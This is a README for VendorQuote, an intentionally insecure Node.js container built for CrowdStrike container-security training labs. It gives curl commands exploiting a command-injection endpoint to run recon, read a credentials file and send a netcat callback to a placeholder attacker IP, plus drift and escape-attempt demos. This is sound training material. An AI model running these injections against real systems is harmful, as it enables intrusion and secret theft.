# VendorQuote - Deliberately Insecure Container for Training

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/docker-ready-blue.svg)](https://www.docker.com/)
[![Node.js](https://img.shields.io/badge/node.js-16-green.svg)](https://nodejs.org/)
[![Security: Intentionally Vulnerable](https://img.shields.io/badge/security-intentionally%20vulnerable-red.svg)](SECURITY.md)

> **⚠️ WARNING: This container is INTENTIONALLY INSECURE**
> **⚠️ FOR EDUCATIONAL USE ONLY**
> This application is designed for container security training labs.
> It contains deliberate security vulnerabilities and should **NEVER** be deployed in production.
> See [SECURITY.md](SECURITY.md) for details on intentional vulnerabilities.

## 🚀 **[Start the Attack Lab →](ATTACK_LAB.md)**

**New to this lab?** Jump straight to the comprehensive attack guide with step-by-step exploitation from both Windows contractor and Kali Linux attacker perspectives.

## 🎓 Overview

**VendorQuote** is a fictional internal procurement pricing portal designed to demonstrate container security concepts including:

- Image-level security issues (secrets, misconfigurations, vulnerabilities)
- Runtime container compromise scenarios
- Container drift detection
- Escape-attempt behaviors
- ASPM service identification and risk mapping

## Business Context

**Persona:** Internal line-of-business application
**Purpose:** Vendor quote management, discount approvals, procurement pricing
**Users:** Procurement staff, finance approvers, vendor-ops analysts, contractors with limited access

This context makes the app realistic for ASPM demonstration and provides a believable storyline for fake sensitive data.

## Architecture

### Tech Stack
- **Runtime:** Node.js 16 (with Debian Bullseye)
- **Framework:** Native Node.js HTTP server (no external dependencies)
- **Frontend:** Server-rendered HTML with CSS
- **Port:** 80 (privileged port, intentionally)

### Application Routes

| Route | Method | Purpose |
|-------|--------|---------|
| `/` | GET | Landing page / dashboard |
| `/healthz` | GET | Health check endpoint (returns "ok") |
| `/quotes` | GET | Vendor pricing quotes table |
| `/approvals` | GET | Discount exception approvals |
| `/support` | GET | Support diagnostic form |
| `/api/support/diag` | POST | **VULNERABLE** diagnostic endpoint |

### Vulnerable Endpoint

**`POST /api/support/diag`**

This endpoint is **intentionally vulnerable** to command injection for training purposes.

```javascript
// Accepts JSON with a "note" field
// Executes the note content via child_process.exec()
// Returns command output in response
```

**Example exploit:**
```bash
curl -X POST http://localhost/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"id && whoami && hostname"}'
```

## Intentional Security Issues

### Image-Level Issues

The Docker image intentionally contains these security findings:

| Finding | Implementation |
|---------|----------------|
| `RunningAsRootContainer` | No `USER` instruction in Dockerfile |
| `UserInstructionNotInDockerfile` | Omitted `USER` entirely |
| `PrivilegedPortFoundInImage` | App listens on port 80, `EXPOSE 80` |
| `ADDInstructionInDockerfile` | Uses `ADD` instead of `COPY` |
| `GCPCredsFoundInImage` | Fake GCP service account JSON at `/app/config/gcp-service-account.json` |
| `SlackCredsFoundInImage` | Fake Slack token at `/app/config/slack.json` |
| `SetUIDBitFoundInImage` | Inherited SUID binaries from base image |
| Package vulnerabilities | Node 14 base image + older dependencies |

### Runtime Posture

The container runs with weak security posture:

- **User:** root (UID 0)
- **Filesystem:** writable root filesystem
- **Tools available:** bash, curl, wget, netcat, procps, coreutils
- **No AppArmor/SELinux restrictions**
- **No capability dropping**

### Embedded Fake Sensitive Data

All sensitive data is **fake** and safe for training:

```
/app/config/.env                    # Fake database passwords, API keys
/app/config/gcp-service-account.json  # Fake GCP service account
/app/config/slack.json               # Fake Slack bot token
/app/keys/vendorquote-internal.pem   # Fake PEM key
/app/data/vendor_pricing_2026.csv    # Fake vendor pricing data
/app/data/discount_exceptions.csv    # Fake approval requests
/app/data/procurement_notes.txt      # Fake internal notes
/app/backup/vendorquote-backup.sql   # Fake database backup
```

## Deployment

### Prerequisites

- Docker installed
- Amazon Linux (or compatible) host
- Port 80 available
- CrowdStrike Falcon Sensor for Linux (for lab exercises)

### Quick Start

#### Option 1: Using helper scripts

```bash
# Build the image
./build.sh

# Run the container
./run.sh

# Verify it's running
curl http://127.0.0.1/healthz

# Stop when done
./stop.sh
```

#### Option 2: Using docker-compose

```bash
# Build and start
docker-compose up -d

# Stop and remove
docker-compose down
```

#### Option 3: Manual Docker commands

```bash
# Build
docker build -t vendorquote:worstcase .

# Run
docker run -d --name vendorquote -p 80:80 vendorquote:worstcase

# Check status
docker ps | grep vendorquote

# View logs
docker logs -f vendorquote

# Stop
docker rm -f vendorquote
```

### Verify Deployment

```bash
# Health check
curl http://127.0.0.1/healthz
# Expected: "ok"

# Landing page
curl http://127.0.0.1/
# Expected: HTML dashboard

# Test vulnerable endpoint
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"whoami"}'
# Expected: {"status":"success","output":"root\n"}
```

## Lab Integration

This container is designed for the **VendorQuote CrowdStrike Office Hours Lab**.

### Lab Scenario Flow

1. **Image Assessment** - Scan image before runtime to identify issues
2. **Deploy Container** - Run with weak posture
3. **Falcon Validation** - Trigger safe test detection
4. **Exploit Weak Endpoint** - Use command injection to run recon commands
5. **Inspect Secrets** - Discover embedded fake credentials
6. **Outbound Callback** - Establish safe C2 channel with netcat
7. **Container Drift** - Download and execute new script
8. **Escape Attempt** - Demonstrate controlled boundary violation
9. **Enable Prevention** - Turn on Falcon prevention policies
10. **ASPM Pivot** - Review service context and business risk

### Key Commands for Lab

```bash
# Falcon test trigger (requires Falcon sensor)
docker exec vendorquote bash -lc 'bash crowdstrike_test_high'

# Basic recon
curl -X POST http://localhost/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"id && whoami && hostname"}'

# Inspect fake secrets
curl -X POST http://localhost/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env"}'

# Safe outbound callback (requires listener on Kali at KALI_IP:4444)
curl -X POST http://localhost/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"echo vendorquote-checkin | nc -nv KALI_IP 4444"}'

# Drift demo - local script creation
docker exec vendorquote bash -lc 'cat > /tmp/evil.sh <<EOF
#!/bin/bash
echo drift-demo
date
EOF
chmod +x /tmp/evil.sh
/tmp/evil.sh'

# Controlled escape-attempt
docker exec vendorquote bash -lc 'chroot /'
```

## File Structure

```
vendorquote/
├── Dockerfile                    # Container build definition
├── docker-compose.yml            # Compose deployment file
├── package.json                  # Node.js dependencies
├── server.js                     # Main Express application
├── build.sh                      # Build helper script
├── run.sh                        # Run helper script
├── stop.sh                       # Stop helper script
├── README.md                     # This file
│
├── app/
│   ├── public/
│   │   └── styles.css           # Corporate portal CSS
│   └── views/
│       ├── index.html           # Dashboard landing page
│       ├── quotes.html          # Vendor quotes table
│       ├── approvals.html       # Discount approvals
│       └── support.html         # Diagnostic form (vulnerable)
│
├── config/
│   ├── .env                     # Fake database creds, API keys
│   ├── gcp-service-account.json # Fake GCP credentials
│   └── slack.json               # Fake Slack token
│
├── keys/
│   └── vendorquote-internal.pem # Fake PEM private key
│
├── data/
│   ├── vendor_pricing_2026.csv  # Fake vendor pricing
│   ├── discount_exceptions.csv  # Fake approval requests
│   └── procurement_notes.txt    # Fake internal notes
│
└── backup/
    └── vendorquote-backup.sql   # Fake database backup
```

## Security by Design (for Training)

This application demonstrates the **opposite** of security best practices:

| What NOT to do | Why it's wrong | What this app does |
|----------------|----------------|-------------------|
| Run as root | Unnecessary privilege | ✗ Runs as root |
| Embed secrets in image | Secrets exposed in layers | ✗ Fake secrets embedded |
| Use privileged ports | Requires elevated access | ✗ Uses port 80 |
| Allow command injection | Arbitrary code execution | ✗ Vulnerable endpoint |
| Use older dependencies | Known CVEs | ✗ Node 14 with old packages |
| Skip USER instruction | Default to root | ✗ No USER in Dockerfile |
| Use ADD instead of COPY | Can unpack archives | ✗ Uses ADD |
| Writable filesystem | Enables persistence | ✗ No read-only root |

**This is intentional for educational value.**

## ASPM Context

The application is designed to be ASPM-friendly:

- **Service name:** vendorquote / vendorquote-web
- **Clear business purpose:** procurement pricing
- **Identifiable dependencies:** package.json, node_modules
- **Internal service references:** `vendorquote-db.internal`, `slack.internal.vendorquote`
- **Source code present:** Enables language/framework detection
- **Fake sensitive data:** Provides data classification signals

## Non-Goals

This application does **NOT** include:

- Kubernetes deployment manifests
- Helm charts
- CI/CD pipeline integration
- Real credentials or secrets
- Real malware or destructive payloads
- Kernel exploitation techniques
- Host filesystem tampering beyond training scenarios
- SSH daemon or remote admin services

## Cleanup

```bash
# Remove container
docker rm -f vendorquote

# Remove image
docker rmi vendorquote:worstcase

# Remove all (including base images - use with caution)
docker system prune -a
```

## Support & Troubleshooting

### Port 80 already in use

```bash
# Find what's using port 80
sudo lsof -i :80

# Change port mapping in run.sh or docker-compose.yml
# Example: -p 8080:80
```

### Container won't start

```bash
# Check logs
docker logs vendorquote

# Verify image exists
docker images | grep vendorquote

# Rebuild if needed
./build.sh
```

### Cannot access from Windows host

- Ensure AWS Security Group allows inbound HTTP (port 80)
- Get the public IP: `curl http://169.254.169.254/latest/meta-data/public-ipv4`
- Access: `http://<PUBLIC_IP>/`

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**DISCLAIMER:** This software is intentionally vulnerable and designed for educational purposes only. See [SECURITY.md](SECURITY.md) for important security information.

## 🤝 Contributing

Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

**Remember:** This is an intentionally vulnerable training application. Do not submit PRs that "fix" the intentional security issues.

## Acknowledgments

Built for CrowdStrike Cloud Security office-hours labs to demonstrate:
- Container image security assessment
- Runtime container threat detection
- Container drift and immutability
- Escape-attempt behaviors
- ASPM service mapping and risk contextualization

---

**Remember:** This is a deliberately vulnerable application for training only.
Never deploy this in production or on systems containing real data.
